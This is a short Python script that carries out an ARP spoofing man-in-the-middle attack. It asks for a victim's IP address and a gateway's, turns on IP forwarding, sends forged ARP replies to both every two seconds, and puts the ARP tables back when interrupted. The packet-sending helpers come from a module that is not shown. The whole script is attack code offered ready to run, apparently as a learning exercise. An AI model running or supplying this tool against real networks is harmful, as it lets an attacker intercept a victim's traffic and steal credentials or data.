import time
from functions import *

def arp_spoofing(victim_ip, gateway, output = False):
    """
    Performs the ARP spoofing attack
    The function should be executed during the attack,
    otherwise ARP table of the victim will be updated to its 
    correct state.

    Step 1: Spoofing victim
    Step 2: Spoofing gateway
    Note: We maintain the number of packets sent in packets_count
    Step 3: Waiting for 'sleep' seconds before sending next packets

    ARP tables will be restored to their correct state on KeyboardInterrupt

    Step 4: Restoring victim's ARP table
    Step 5: Restoring gateway's ARP table
    """

    sleep = 2
    packets_count = 0
    enable_ip_forwarding()
    
    try:
        while True:
            # Step 1
            modify_arp_table(victim_ip, gateway, output)

            # Step 2
            modify_arp_table(gateway, victim_ip, output)

            packets_count += 2
            print(f"\n[+] Packets sent: {packets_count}", end="")

            # Step 3
            time.sleep(sleep)
    except KeyboardInterrupt:
        print("\n Reseting ARP tables. Please wait...")
        
        # Step 4
        restore_arp_table(victim_ip, gateway, output)

        # Step 5
        restore_arp_table(gateway, victim_ip, output)

        print("\n ARP tables restored.")
        
victim_ip = input("Enter victim's IP address: ")
gateway = input("Enter gateway's IP address: ")
arp_spoofing(victim_ip, gateway, False)